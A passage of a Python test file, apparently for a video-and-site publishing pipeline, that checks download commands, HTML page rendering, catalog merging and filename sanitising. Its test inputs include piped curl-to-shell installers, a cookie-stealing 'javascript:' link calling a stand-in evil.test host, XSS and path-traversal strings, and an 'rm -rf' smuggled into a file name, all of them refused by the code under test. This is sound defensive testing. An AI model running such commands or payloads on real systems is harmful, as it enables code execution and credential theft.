    assert p["args"][0] == sys.executable and p["args"][-1] == "D"
    assert p["args"][1:4] == ["-m", "pip", "download"], \
        "the verb IS the security invariant — install would execute"
    i = p["args"].index("--only-binary")
    assert p["args"][i + 1] == ":all:" and "--no-deps" in p["args"]
    assert "--no-cache-dir" in p["args"], "a cached wheel is a 0.1s 'download' — a lie"

    # extras, pins and flags reduce to the bare name
    p = rc.check_plan("pip install -U 'transformers[torch]>=4.44'", "D")
    assert p["target"] == "transformers"

    # a URL install is a source build = execution; refuse, do not "fail later".
    # So is a local directory ('.'), and a consuming flag's argument is not a
    # package (pip download requirements.txt would fetch a PyPI squatter's wheel).
    assert rc.check_plan("pip install git+https://github.com/o/r", "D") is None
    assert rc.check_plan("pip install .", "D") is None
    assert rc.check_plan("pip install -e .", "D") is None
    assert rc.check_plan("pip install -r requirements.txt", "D") is None

    p = rc.check_plan("git clone https://github.com/ollama/ollama", "D")
    assert p["kind"] == "clone" and p["args"] == \
        ["git", "clone", "--depth", "1", "https://github.com/ollama/ollama", "D"]

    p = rc.check_plan("curl -LO https://example.com/model.gguf", "D")
    assert p["kind"] == "fetch" and p["target"] == "https://example.com/model.gguf" \
        and p["args"] == []

    # the first CHECKABLE segment wins, non-matching segments are skipped
    p = rc.check_plan("cd app • pip install foo • git clone https://x.com/y", "D")
    assert p["kind"] == "pip" and p["target"] == "foo"

    for refused in ("curl -fsSL https://ollama.com/install.sh | sh",
                    "docker run -it ubuntu", "npx create-thing",
                    "bash <(curl https://x.sh)", "just words no commands",
                    # the review caught the non-piped shell forms slipping through:
                    "curl https://x.sh -o i.sh && sh i.sh",
                    "wget https://x.sh; bash x.sh",
                    'bash -c "$(curl -fsSL https://x.sh)"',
                    "sh -c `curl https://x.sh`"):
        assert rc.check_plan(refused, "D") is None, refused


def test_run_check_fails_soft_at_every_seam(monkeypatch, tmp_path):
    """The unattended-run law: timeout, nonzero exit, empty destination and a dead
    network each return None — never a raise, and the destination never survives."""
    from factverse import receipts as rc
    plan = rc.check_plan("pip install foo", str(tmp_path / "dl"))

    class _R:
        returncode = 1
        stdout = stderr = ""
    monkeypatch.setattr(rc.subprocess, "run", lambda *a, **k: _R())
    assert rc.run_check(plan) is None

    def boom(*a, **k):
        raise rc.subprocess.TimeoutExpired(cmd="pip", timeout=180)
    monkeypatch.setattr(rc.subprocess, "run", boom)
    assert rc.run_check(plan) is None

    class _OK:
        returncode = 0
        stdout = "Collecting foo"
        stderr = ""
    monkeypatch.setattr(rc.subprocess, "run", lambda *a, **k: _OK())  # empty dest
    assert rc.run_check(plan) is None
    assert not (tmp_path / "dl").exists(), "destination must be cleaned up on failure too"

    import requests as _requests
    monkeypatch.setattr(_requests, "get",
                        lambda *a, **k: (_ for _ in ()).throw(RuntimeError("net down")))
    fplan = rc.check_plan("curl -LO https://example.com/m.gguf", str(tmp_path / "dl"))
    assert rc.run_check(fplan) is None
    assert rc.run_check(None) is None

    # the review's high finding: requests' timeout bounds the gap BETWEEN reads,
    # not the total — an endless stream must trip the byte cap / wall clock, not
    # hold the unattended run until the 90-minute CI job kill
    class _Stream:
        status_code = 200
        def __enter__(self):
            return self
        def __exit__(self, *a):
            return False
        def iter_content(self, n):
            while True:
                yield b"x" * 1024
    monkeypatch.setattr(_requests, "get", lambda *a, **k: _Stream())
    monkeypatch.setattr(rc, "FETCH_MAX_BYTES", 4096)
    assert rc.run_check(fplan) is None
    assert not (tmp_path / "dl").exists()


def test_run_check_measures_the_real_download(monkeypatch, tmp_path):
    """Seconds and megabytes come from the measured download, the output lines are
    the footage, and the destination (GBs for a torch wheel) is removed after."""
    from factverse import receipts as rc
    dest = tmp_path / "dl"
    plan = rc.check_plan("pip install foo", str(dest))

    class _OK:
        returncode = 0
        stdout = "Collecting foo\nDownloading foo-1.0-py3-none-any.whl (15.5 MB)\nSaved foo.whl"
        stderr = ""

    def fake_run(args, **kw):
        d = Path(args[-1])
        d.mkdir(parents=True, exist_ok=True)
        with open(d / "foo.whl", "wb") as f:
            f.seek(15_500_000 - 1)
            f.write(b"x")
        return _OK()
    monkeypatch.setattr(rc.subprocess, "run", fake_run)
    monkeypatch.setattr(rc, "_pypi_info", lambda p: {"version": "1.0", "released": "2026-08-01"})
    r = rc.run_check(plan)
    assert r["kind"] == "pip" and r["target"] == "foo"
    assert r["mb"] == 16 and isinstance(r["seconds"], float)
    assert r["lines"][0] == "Collecting foo" and len(r["lines"]) <= 8
    assert r["version"] == "1.0" and len(r["date"]) == 10
    assert not dest.exists(), "a torch-sized wheel must not be left on the runner"
    # the rounding contract: 1 decimal under 10 MB, whole numbers from 10 up —
    # and a real download is never spoken as "0 megabytes"
    assert rc._round_mb(9_440_000) == 9.4 and rc._round_mb(15_500_000) == 16
    assert rc._round_mb(40_000) == 0.1 and rc._round_mb(0) == 0


def test_footage_lines_show_the_tool_not_the_runner():
    """Live-inspection amendments (spec v3-E.2): the first real frames carried pip's
    [notice] upgrade nags and the machine's own temp path in the 'Saved' line —
    runner housekeeping burned onto a to-be-published video."""
    from factverse import receipts as rc
    raw = ("Collecting openai\n"
           "Saved d:\\temp\\factverse\\temp\\receipts_dl\\openai-3.3.1-py3-none-any.whl\n"
           "Successfully downloaded openai\n"
           "[notice] A new release of pip is available: 24.0 -> 26.2.1\n"
           "[notice] To update, run: python.exe -m pip install --upgrade pip\n")
    lines = rc._clean_lines(raw)
    assert lines == ["Collecting openai", "Saved openai-3.3.1-py3-none-any.whl",
                     "Successfully downloaded openai"]
    assert rc._clean_lines("\n".join(f"line {i}" for i in range(20)))[-1] == "line 7"
    # ...on BOTH separators (pathlib's .name is a no-op for backslashes on posix —
    # the exact bug that turned this test red on ubuntu CI), and for the clone
    # branch's own path leak, git's "Cloning into '<abs path>'..." stderr line
    assert rc._basename("/home/runner/work/repo/x.whl") == "x.whl"
    assert rc._basename("d:\\temp\\dl\\x.whl") == "x.whl"
    posix = rc._clean_lines("Saved /home/runner/work/FactVerse/temp/receipts_dl/x.whl\n"
                            "Cloning into '/home/runner/work/FactVerse/temp/receipts_dl'...\n")
    assert posix == ["Saved x.whl", "Cloning into 'receipts_dl'..."]


def test_beat_lands_on_the_install_scene_and_nowhere_else():
    """spec v3-E.2 #8/#9: the beat is appended to the SAME scene inject_code_card
    targets (first INSTALL_KW scene, never hook, never finale); a script with no
    install scene gets no beat at all; the result survives rewrites via _CARRY."""
    from factverse import receipts as rc
    res = {"kind": "pip", "target": "foo", "seconds": 18.4, "mb": 247,
           "lines": [], "date": "2026-08-24"}
    s = {"scenes": [{"narration": "Hook - the promise."},
                    {"narration": "Install it with pip install foo."},
                    {"narration": "Now build things."},
                    {"narration": "The exact command is in the description."}]}
    assert rc.install_scene_idx(s) == 1
    assert rc.add_beat(s, res)
    beat = rc.beat_text(res)
    assert s["scenes"][1]["narration"].endswith(beat)
    assert beat == (f"Checked by {ap.fv.CHANNEL_NAME} on August 24: the download "
                    f"finished in 18.4 seconds at 247 megabytes.")
    assert "megabytes" in beat and "MB" not in beat, "TTS reads units as words"
    assert s["scenes"][0]["narration"] == "Hook - the promise."
    assert s["receipts"] is res
    assert "receipts" in ap._CARRY, \
        "a script-level key not in _CARRY is DROPPED by every rewrite pass (the documented trap)"

    bare = {"scenes": [{"narration": "Hook."}, {"narration": "Just talk."},
                       {"narration": "Bye."}]}
    assert rc.install_scene_idx(bare) is None
    assert not rc.add_beat(bare, res)
    assert "receipts" not in bare and bare["scenes"][1]["narration"] == "Just talk."


def test_beat_numbers_support_the_packaging():
    """spec v3-E.2 #7: the beat lands before packaging_payoff reads the narration,
    so a thumb number spoken only in the beat is a KEPT promise, not a stripped one."""
    from factverse import gates
    from factverse import receipts as rc
    res = {"kind": "pip", "target": "foo", "seconds": 12, "mb": 247,
           "lines": [], "date": "2026-08-24"}
    s = {"title": "How to run Foo locally", "thumb_text": "247 MB",
         "format": "tool", "verified_facts": {},
         "scenes": [{"narration": "Hook."},
                    {"narration": "Install it with pip install foo."},
                    {"narration": "Outro."}]}
    stripped = gates.packaging_payoff(dict(s, scenes=[dict(x) for x in s["scenes"]]))
    assert not stripped["ok"], "sanity: without the beat, 247 is an unkept promise"
    assert rc.add_beat(s, res)
    kept = gates.packaging_payoff(s)
    assert kept["ok"] and s["thumb_text"] == "247 MB"


def test_receipt_clip_replaces_the_card_and_renders_to_its_exact_slot(monkeypatch):
    """The C.3 law: a scene's time splits equally between its clips, so the animated
    clip must be rendered to the share step5_build will actually give it — replacing
    a leading stat/code card keeps the denominator, joining raises it by one."""
    from factverse import receipts as rc
    asked = []
    monkeypatch.setattr(rc, "make_terminal_clip",
                        lambda res, out, seconds: asked.append(round(seconds, 3)) or "R.mp4")
    s = {"receipts": {"kind": "pip", "target": "foo", "seconds": 1, "mb": 1,
                      "lines": [], "date": "2026-08-24"},
         "scenes": [{"narration": "Hook."},
                    {"narration": "Install it with pip install foo."},
                    {"narration": "Outro."}]}
    clips = [["shot0.mp4"], ["statcard_02.mp4", "shot1.mp4"], ["shot2.mp4"]]
    assert rc.inject_receipt_clip(s, clips, [4.0, 8.0, 4.0]) == 1
    assert clips[1] == ["R.mp4", "shot1.mp4"] and asked[-1] == 4.0  # replaced: 8/2

    clips = [["shot0.mp4"], ["codecard.mp4", "shot1.mp4"], ["shot2.mp4"]]
    assert rc.inject_receipt_clip(s, clips, [4.0, 8.0, 4.0]) == 1
    assert clips[1][0] == "R.mp4" and len(clips[1]) == 2 and asked[-1] == 4.0

    clips = [["shot0.mp4"], ["shot1.mp4"], ["shot2.mp4"]]
    assert rc.inject_receipt_clip(s, clips, [4.0, 8.0, 4.0]) == 1
    assert clips[1] == ["R.mp4", "shot1.mp4"] and asked[-1] == 4.0  # joined: 8/(1+1)

    assert rc.inject_receipt_clip({"scenes": s["scenes"]}, clips, [4, 8, 4]) == 0
    assert rc.inject_receipt_clip(s, [], [4, 8, 4]) == 0
    assert rc.inject_receipt_clip(s, clips, None) == 0, "no timings -> no clip, never a guess"


def test_terminal_clip_frames_are_real_and_reveal_the_summary(monkeypatch, tmp_path):
    """The frames are rendered (1280x720, FPS 30, brand baseline) and the summary
    line actually ARRIVES at 70% — a reveal that never fires would show a receipt
    with no verdict. ffmpeg itself is stubbed (tests never run it)."""
    from PIL import Image
    from factverse import receipts as rc
    seen = {}

    def fake_ffmpeg(args, timeout=300):
        fdir = Path([a for a in args if a.endswith("%04d.png")][0]).parent
        frames = sorted(fdir.glob("*.png"))
        seen["n"] = len(frames)
        seen["fps"] = args[args.index("-framerate") + 1]
        first, last = Image.open(frames[0]), Image.open(frames[-1])
        seen["size"] = first.size
        seen["baseline"] = last.getpixel((640, 716))
        g = (63, 185, 80)
        count = lambda im: next((n for n, c in (im.getcolors(1 << 20) or []) if c == g), 0)
        seen["green_grew"] = count(last) > count(first)
        with open(args[-1], "wb") as f:
            f.write(b"\0" * 25000)
        return True
    monkeypatch.setattr(rc, "_ffmpeg", fake_ffmpeg)
    res = {"kind": "pip", "target": "foo", "seconds": 3.2, "mb": 12,
           "lines": ["Collecting foo", "Saved foo-1.0-py3-none-any.whl"],
           "date": "2026-08-24"}
    out = rc.make_terminal_clip(res, str(tmp_path / "receipt.mp4"), 0.2)
    assert out and seen["n"] == 6 and seen["fps"] == "30"
    assert seen["size"] == (1280, 720) and seen["baseline"] == (220, 38, 38)
    assert seen["green_grew"], "the summary line never arrived on the held frame"
    # frame count CEILS: a clip even 1/30s short of its share is looped by
    # step5_build and the wrapped first frame flashes at the scene cut
    rc.make_terminal_clip(res, str(tmp_path / "z.mp4"), 0.21)
    assert seen["n"] == 7
    assert rc.make_terminal_clip(res, str(tmp_path / "x.mp4"), 0) is None
    assert rc.make_terminal_clip({}, str(tmp_path / "y.mp4"), 3) is None


# =============================================================== v3-F.1: the site
import pytest

from factverse import site
from factverse import state_merge as sm


def _entry(page="2026-08-31-a.html", **over):
    e = {"page": page, "pdf": page[:-5] + ".pdf", "title": "A Tool", "slug": "a",
         "date": "2026-08-31", "tool": "x/y", "command": "pip install x",
         "source_url": "https://github.com/x/y",
         "video_url": "https://youtube.com/watch?v=ABCDEFGHIJK",
         "video_id": "ABCDEFGHIJK", "what": "It does a thing.",
         "uses": ["one", "two", "three"], "skip_if": "You use Windows."}
    e.update(over)
    return e


def test_page_name_shares_the_pdf_stem():
    """v3-F.1 #6: one slug, two files. A second naming rule would drift and 404."""
    assert site.page_name("2026-08-31-hello.pdf") == "2026-08-31-hello.html"
    assert site.page_name("2026-08-31-hello.PDF") == "2026-08-31-hello.html"
    assert site.page_name("") == ""
    assert site.page_name(None) == ""


def test_video_id_survives_every_url_form():
    for u in ("https://youtube.com/watch?v=ABCDEFGHIJK",
              "https://youtu.be/ABCDEFGHIJK",
              "https://www.youtube-nocookie.com/embed/ABCDEFGHIJK",
              "https://youtube.com/shorts/ABCDEFGHIJK"):
        assert site.video_id(u) == "ABCDEFGHIJK", u
    assert site.video_id("") == "" and site.video_id(None) == ""
    assert site.video_id("https://example.com/watch?v=short") == ""


def test_render_page_carries_every_locked_section(monkeypatch):
    """v3-F.1 #7/#9/#10 - the sections, the copy button and the share card."""
    monkeypatch.setattr(site.fv, "setting", _settings(deliverable_base_url="https://x.test"))
    h = site.render_page(_entry())
    assert "<h1>A Tool</h1>" in h
    assert 'id="cmd">pip install x<' in h and 'id="c"' in h        # command + Copy button
    assert "It does a thing." in h
    for u in ("one", "two", "three"):
        assert "<li>" + u + "</li>" in h
    assert "You use Windows." in h
    assert "youtube-nocookie.com/embed/ABCDEFGHIJK" in h           # #7 embed
    assert 'href="2026-08-31-a.pdf"' in h                          # PDF download, same dir
    assert "https://github.com/x/y" in h
    # #10: the card F.2/F.3 will rely on
    assert ('property="og:image" content='
            '"https://i.ytimg.com/vi/ABCDEFGHIJK/maxresdefault.jpg"') in h
    assert 'rel="canonical" href="https://x.test/tools/2026-08-31-a.html"' in h
    assert 'name="twitter:card" content="summary_large_image"' in h
    # no network dependencies (#9): no CDN, no font host, no analytics
    for bad in ("cdn.", "fonts.googleapis", "google-analytics", "gtag"):
        assert bad not in h


def test_render_page_escapes_everything_it_interpolates():
    """A repo title or README-derived command is untrusted text. It is HTML-escaped
    everywhere, including in the copy button's source - the command lives in the DOM
    as text, never as a JS string literal."""
    h = site.render_page(_entry(title="<script>alert(1)</script>",
                                command='echo "<b>&</b>"',
                                what="a & b", source_url="https://x/?a=1&b=2"))
    assert "<script>alert(1)</script>" not in h
    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in h
    assert "&lt;b&gt;&amp;&lt;/b&gt;" in h
    assert h.count("<script>") == 1                    # only our own copy handler


def test_render_page_degrades_when_fields_are_missing():
    """A run with no upload, no PDF and a failed extraction still gets a page."""
    h = site.render_page({"page": "p.html", "title": "T", "date": "2026-08-31"})
    assert "<h1>T</h1>" in h
    for absent in ("<iframe", "og:image", "Download the 1-page PDF", 'id="cmd"'):
        assert absent not in h
    assert site.render_page({}).startswith("<!doctype html>")
    assert site.render_page(None).startswith("<!doctype html>")


def test_index_is_newest_first_and_survives_an_empty_catalog(monkeypatch):
    monkeypatch.setattr(site.fv, "setting", _settings())
    rows = [_entry("2026-08-29-a.html", date="2026-08-29", title="Older"),
            _entry("2026-08-31-b.html", date="2026-08-31", title="Newer")]
    h = site.render_index(rows)
    assert h.index("Newer") < h.index("Older")          # #11 newest first
    assert 'href="tools/2026-08-31-b.html"' in h
    assert "2 tools" in h
    empty = site.render_index([])
    assert "The first tool page lands here" in empty and "<h1>" in empty


def test_rebuild_is_deterministic_and_only_writes_on_change(monkeypatch, tmp_path):
    """Acceptance #2: same catalog in, byte-identical files out - so CI can rebuild
    the site after state_merge instead of stashing HTML the way it stashes PDFs."""
    monkeypatch.setattr(site.fv, "setting", _settings())
    monkeypatch.setattr(site, "DOCS", tmp_path)
    monkeypatch.setattr(site, "TOOLS_DIR", tmp_path / "tools")
    rows = [_entry("2026-08-2%d-t.html" % i, date="2026-08-2%d" % i) for i in (1, 2, 3)]
    assert site.rebuild(rows) == 5                       # 3 pages + index + sitemap
    before = {p.name: p.read_bytes() for p in tmp_path.rglob("*") if p.is_file()}
    assert len(before) == 5 and "index.html" in before and "sitemap.xml" in before
    assert site.rebuild(rows) == 0                       # nothing changed -> git stays clean
    after = {p.name: p.read_bytes() for p in tmp_path.rglob("*") if p.is_file()}
    assert before == after
    xml = (tmp_path / "sitemap.xml").read_text(encoding="utf-8")
    assert xml.count("<url>") == 4 and "2026-08-23-t.html" in xml


def test_rebuild_caps_the_pages_it_rewrites(monkeypatch, tmp_path):
    """The catalog grows forever; regeneration must not. Older pages stay on disk."""
    monkeypatch.setattr(site.fv, "setting", _settings())
    monkeypatch.setattr(site, "DOCS", tmp_path)
    monkeypatch.setattr(site, "TOOLS_DIR", tmp_path / "tools")
    monkeypatch.setattr(site, "MAX_PAGES", 2)
    rows = [_entry("2026-08-1%d-t.html" % i, date="2026-08-1%d" % i) for i in (1, 2, 3)]
    site.rebuild(rows)
    assert sorted(p.name for p in (tmp_path / "tools").iterdir()) == \
        ["2026-08-12-t.html", "2026-08-13-t.html"]
    assert "2026-08-11-t.html" in (tmp_path / "index.html").read_text(encoding="utf-8")


def test_every_site_seam_fails_soft(monkeypatch, tmp_path):
    """#12: this runs between yt_upload and record_run. A raise here publishes a
    SECOND video into the same slot, so no path may raise - ever."""
    boom = lambda *a, **k: (_ for _ in ()).throw(RuntimeError("boom"))
    with pytest.MonkeyPatch.context() as mp:
        mp.setattr(site.fv, "setting", _settings())
        mp.setattr(site, "DOCS", tmp_path)
        mp.setattr(site, "TOOLS_DIR", tmp_path / "tools")
        mp.setattr(site, "render_page", boom)
        # one unrenderable row is SKIPPED, and the index + sitemap below it are still
        # written: aborting the loop froze the whole site at its last good state
        # forever, while publish_page still returned a URL and the ledger still said
        # tool_page=True. Nothing about that was visible in the log.
        assert site.rebuild([_entry()]) == 2
        assert (tmp_path / "index.html").exists() and (tmp_path / "sitemap.xml").exists()
    with pytest.MonkeyPatch.context() as mp:
        mp.setattr(site.fv, "setting", _settings())
        mp.setattr(site, "DOCS", tmp_path)
        mp.setattr(site, "TOOLS_DIR", tmp_path / "tools")
        mp.setattr(site, "render_index", boom)         # outside the loop -> -1, no raise
        assert site.rebuild([_entry()]) == -1
    with pytest.MonkeyPatch.context() as mp:
        mp.setattr(site.fv, "setting", _settings())
        mp.setattr(site, "CATALOG", tmp_path / "cat.json")
        mp.setattr(site, "entry_for", boom)
        assert site.publish_page({"cheat_sheet": "a.pdf"}, {}, "u") is None
    # an unwritable catalog is reported, not raised
    with pytest.MonkeyPatch.context() as mp:
        mp.setattr(site.fv, "setting", _settings())
        mp.setattr(site, "CATALOG", tmp_path / "cat.json")
        mp.setattr(site, "save_catalog", boom)
        assert site.publish_page(_entry(), {}, "u") is None
    # a corrupt or missing catalog reads as empty, never as a crash
    bad = tmp_path / "bad.json"
    bad.write_text("{not json", encoding="utf-8")
    assert site.load_catalog(bad) == []
    assert site.load_catalog(tmp_path / "nope.json") == []
    bad.write_text('{"page": "x"}', encoding="utf-8")     # a dict, not a list
    assert site.load_catalog(bad) == []


def test_kill_switch_stops_the_page(monkeypatch, tmp_path):
    monkeypatch.setattr(site, "CATALOG", tmp_path / "cat.json")
    monkeypatch.setattr(site.fv, "setting", _settings(site_pages=False))
    assert site.publish_page(_tool_script(5), {}, "https://youtu.be/ABCDEFGHIJK") is None
    assert not (tmp_path / "cat.json").exists()


def test_entry_and_upsert_replace_rather_than_stack(monkeypatch):
    monkeypatch.setattr(site.fv, "setting", _settings())
    s = dict(_tool_script(5), cheat_sheet="2026-08-31-t.pdf", signal_title="x/y")
    e = site.entry_for(s, {"what": "w", "uses": "a\nb\nc\nd", "skip_if": "s"},
                       "https://youtu.be/ABCDEFGHIJK")
    assert e["page"] == "2026-08-31-t.html" and e["pdf"] == "2026-08-31-t.pdf"
    assert e["command"] == "pip install x" and e["video_id"] == "ABCDEFGHIJK"
    assert e["uses"] == ["a", "b", "c"]           # a string answer is coerced, then capped
    assert e["tool"] == "x/y"
    rows = site.upsert([e], dict(e, title="Corrected"))
    assert len(rows) == 1 and rows[0]["title"] == "Corrected"


def test_catalog_merge_keeps_one_row_per_page():
    """The generic list union dedups on exact equality, so a retry with a new
    video_url would print the same tool twice on the index."""
    assert "state/tools_index.json" in sm.FILES
    ours = json.dumps([_entry(video_url="https://youtu.be/NEWNEWNEW1", title="Ours")])
    theirs = json.dumps([_entry(video_url=""),
                         _entry("2026-08-30-b.html", date="2026-08-30")])
    merged = json.loads(sm.merge_file("state/tools_index.json", ours, theirs))
    assert len(merged) == 2
    row = next(r for r in merged if r["page"] == "2026-08-31-a.html")
    assert row["title"] == "Ours" and row["video_url"] == "https://youtu.be/NEWNEWNEW1"
    # a later date wins over an earlier one regardless of side
    late = json.dumps([_entry(date="2026-09-02", title="Later")])
    m2 = json.loads(sm.merge_file("state/tools_index.json", theirs, late))
    assert next(r for r in m2 if r["page"] == "2026-08-31-a.html")["title"] == "Later"
    # junk rows never reach the renderer
    m3 = json.loads(sm.merge_file("state/tools_index.json",
                                  json.dumps(["x", {}, None]), theirs))
    assert all(isinstance(r, dict) and r.get("page") for r in m3)


def test_ci_stashes_and_rebuilds_the_site():
    """The tracked-state trap: a file the run writes must be in BOTH the stash list
    and state_merge.FILES, or `checkout -B main origin/main` reverts it silently."""
    wf = (Path(__file__).resolve().parents[1] / ".github/workflows/publish.yml").read_text(
        encoding="utf-8")
    assert "state/tools_index.json" in wf
    # the rebuild must run AFTER the merge (the merged catalog is the source of truth)
    # and BEFORE the add, or the regenerated HTML is never committed
    merge_at = wf.index("python -m factverse.state_merge")
    build_at = wf.index("python -m factverse.site")
    add_at = wf.index("git add docs/index.html")
    assert merge_at < build_at < add_at
    assert "git add docs/tools" in wf and "docs/sitemap.xml" in wf


def test_planted_cheat_sheet_name_cannot_escape_or_ship(monkeypatch, tmp_path):
    """The _CARRY trap in a new place. `cheat_sheet` is in _CARRY and
    `_validate_script` mutates the LLM's dict IN PLACE, so a model-planted key
    SURVIVES. Measured before the fix: the planted name was stamped into the
    published description AND joined onto TOOLS_DIR, so '../../../x.pdf' wrote an
    HTML page outside docs/ while _write reported success.

    Two defences, both pinned here: run() pops the key (it computes it itself, the
    way it pops `receipts`), and safe_name() refuses a path either way.
    """
    # 1. the name is basenamed on BOTH separators, then charset-filtered
    assert dlv.safe_name("../../../PLANTED.pdf") == "PLANTED.pdf"
    assert dlv.safe_name(r"..\..\windows\PLANTED.pdf") == "PLANTED.pdf"
    assert dlv.safe_name("/etc/passwd") == "passwd"
    assert dlv.safe_name("a b;rm -rf.pdf") == "a-b-rm--rf.pdf"
    assert dlv.safe_name("...") == "" and dlv.safe_name("") == "" and dlv.safe_name(None) == ""
    assert len(dlv.safe_name("x" * 400)) == 120

    # 2. a planted page name never becomes a path when the site is rebuilt
    monkeypatch.setattr(site.fv, "setting", _settings())
    monkeypatch.setattr(site, "DOCS", tmp_path)
    monkeypatch.setattr(site, "TOOLS_DIR", tmp_path / "tools")
    site.rebuild([_entry(page="../../../ESCAPED.html"), _entry(page="../evil"), _entry()])
    written = sorted(p.name for p in tmp_path.rglob("*.html"))
    assert written == ["2026-08-31-a.html", "ESCAPED.html", "index.html"]
    assert not list(tmp_path.parent.glob("ESCAPED.html"))     # nothing above the root
    assert not list(tmp_path.glob("evil"))                    # not even an extensionless one


def test_run_pops_a_planted_cheat_sheet_before_it_is_published():
    """The description link is a permanent artifact of a live video: it must be the
    name run() derives from the title, never one the model handed us."""
    src = (Path(ap.__file__)).read_text(encoding="utf-8")
    i_pop = src.index('script.pop("cheat_sheet", None)')
    i_place = src.index("def place_description_blocks")
    i_recpop = src.index('script.pop("receipts", None)')
    assert abs(i_pop - i_recpop) < 800          # popped beside receipts, same reason
    # and the value the description ends up with is derived, not carried
    s = ap._validate_script(
        {"title": "Real Title", "description": "hook.\n\nbody", "tags": [],
         "cheat_sheet": "../../../PLANTED.pdf",
         "scenes": [{"narration": "w " * 40, "visual_query": "v"} for _ in range(6)]},
        "Real Title", "https://github.com/x/y")
    s.pop("cheat_sheet", None)                  # what run() does at that line
    s["format"] = "tool"
    s["deliverable"] = {"kind": "command", "text": "pip install x", "url": "https://x/y"}
    ap.place_description_blocks(s)
    assert "PLANTED" not in s["description"]
    assert s["cheat_sheet"].endswith("-real-title.pdf")


# ---- v3-F.1 review pass: 9 reproduced defects, one test each ----------------
def test_a_name_planted_in_a_LATER_rewrite_pass_dies_too():
    """The first fix popped `cheat_sheet` once in run() — but critique_pass,
    enforce_length and enforce_max_length all run AFTER that pop, and _carry_over
    only restores a key it finds in the source. A name planted in the critique
    answer therefore survived, and place_description_blocks ('and not
    script.get("cheat_sheet")') declined to overwrite it: the live video shipped
    '.../tools/' with no file name at all when safe_name reduced it to ''.

    The pop belongs INSIDE _validate_script, which every pass runs before
    _carry_over hands the legitimate value back."""
    planted = {"title": "T", "description": "hook.\n\nbody", "tags": [],
               "cheat_sheet": "...", "receipts": {"kind": "pip", "mb": 999},
               "scenes": [{"narration": "w " * 40, "visual_query": "v"} for _ in range(6)]}
    v = ap._validate_script(dict(planted), "T", "https://github.com/x/y")
    assert "cheat_sheet" not in v and "receipts" not in v      # both plants dropped

    # ...and the real one still survives the pass, because _carry_over restores it
    real = dict(v, cheat_sheet="2026-08-31-real.pdf", receipts={"kind": "pip", "mb": 1})
    carried = ap._carry_over(real, ap._validate_script(dict(planted), "T", ""))
    assert carried["cheat_sheet"] == "2026-08-31-real.pdf"
    assert carried["receipts"]["mb"] == 1


def test_the_page_never_offers_a_pdf_that_was_not_written(monkeypatch, tmp_path):
    """make_cheat_sheet is fail-soft (None on a reportlab failure or a <1KB file).
    run() has that answer; entry_for used to ignore it and render the download
    button anyway, so the page shipped a 404 on exactly the day the PDF seam failed."""
    monkeypatch.setattr(site.fv, "setting", _settings())
    s = dict(_tool_script(5), cheat_sheet="2026-08-31-t.pdf", title="T")
    wrote = site.entry_for(s, {}, "", pdf="2026-08-31-t.pdf")
    failed = site.entry_for(s, {}, "", pdf=None if False else "")   # make_cheat_sheet -> None
    assert wrote["pdf"] == "2026-08-31-t.pdf" and failed["pdf"] == ""
    assert "Download the 1-page PDF" in site.render_page(wrote)
    assert "Download the 1-page PDF" not in site.render_page(failed)
    # the page itself is still written — only the button is gone
    assert failed["page"] == "2026-08-31-t.html"


def test_pdf_href_and_the_written_file_are_the_same_name(monkeypatch):
    """entry_for sanitized `page` but stored `pdf` raw, so the moment safe_name
    changed anything the button pointed somewhere the PDF was never written."""
    monkeypatch.setattr(site.fv, "setting", _settings())
    e = site.entry_for({"title": "T", "cheat_sheet": "../../../../CNAME.pdf"}, {}, "",
                       pdf="../../../../CNAME.pdf")
    assert e["pdf"] == "CNAME.pdf" == dlv.safe_name("../../../../CNAME.pdf")
    h = site.render_page(e)
    assert 'href="CNAME.pdf"' in h
    assert "../../" not in h          # only the brand's own ../index.html may be relative
    assert h.count("../") == 1
    # and a long name keeps the extension it is looked up by
    long_pdf = dlv.safe_name("2026-08-31-" + "x" * 300 + ".pdf")
    assert long_pdf.endswith(".pdf") and len(long_pdf) <= 120
    assert site.page_name(long_pdf).endswith(".html")


def test_a_non_http_source_url_is_never_linked(monkeypatch):
    """deliverable.url is written by a model grounded in a third-party README, and
    the page is served from our own Pages origin. html.escape cannot help: a scheme
    is not a metacharacter. screencap.py already refuses this same field."""
    monkeypatch.setattr(site.fv, "setting", _settings())
    for bad in ("javascript:fetch('https://evil.test/'+document.cookie)",
                "data:text/html;base64,PHNjcmlwdD4=", "vbscript:x", "  JavaScript:alert(1)"):
        e = site.entry_for({"title": "T", "cheat_sheet": "a.pdf",
                            "deliverable": {"text": "pip install x", "url": bad}}, {}, "")
        assert e["source_url"] == "", bad
        assert "javascript" not in site.render_page(e).lower()
        assert "data:text/html" not in site.render_page(e)
    ok = site.entry_for({"title": "T", "cheat_sheet": "a.pdf",
                         "deliverable": {"text": "x", "url": "https://github.com/x/y"}}, {}, "")
    assert ok["source_url"] == "https://github.com/x/y"


def test_every_url_surface_uses_the_same_sanitized_name(monkeypatch, tmp_path):
    """rebuild() sanitized only the FILE it wrote; the canonical, the index href and
    the sitemap <loc> interpolated the raw `page` — so they could advertise a URL the
    generator had deliberately refused to create. The catalog is merged state read
    back off origin/main, so it is the input trusted least."""
    monkeypatch.setattr(site.fv, "setting", _settings(deliverable_base_url="https://x.test"))
    monkeypatch.setattr(site, "DOCS", tmp_path)
    monkeypatch.setattr(site, "TOOLS_DIR", tmp_path / "tools")
    hostile = [_entry(page="../../../pwned.html"), _entry(page='q".html'),
               _entry(page="no-extension"), _entry()]
    site.rebuild(hostile)
    on_disk = sorted(p.name for p in (tmp_path / "tools").iterdir())
    index = (tmp_path / "index.html").read_text(encoding="utf-8")
    smap = (tmp_path / "sitemap.xml").read_text(encoding="utf-8")
    assert on_disk == ["2026-08-31-a.html", "pwned.html", "q-.html"]
    for name in on_disk:
        assert f'href="tools/{name}"' in index
        assert f"https://x.test/tools/{name}" in smap
    assert "../" not in index and "../" not in smap
    assert "no-extension" not in index and "no-extension" not in smap   # never written
    import xml.etree.ElementTree as ET
    assert len(ET.fromstring(smap)) == 4                                # parses; root + 3


def test_sitemap_filters_before_it_sorts():
    """The isinstance guard ran on sorted()'s OUTPUT, so the non-dict it was written
    for reached .get() first — and that raise skipped the index write above it."""
    rows = [{"page": "a.html", "date": "2026-01-01"}, "junk", None, 42]
    assert site.render_sitemap(rows).count("<url>") == 2       # root + the one real row
    assert site.render_index(rows).count('class="row"') == 1
    assert site.render_sitemap([]).endswith("</urlset>")


def test_the_kill_switch_can_be_flipped_from_the_environment(monkeypatch, tmp_path):
    """fv.setting returns an env var as a STRING and bool("false") is True, so the
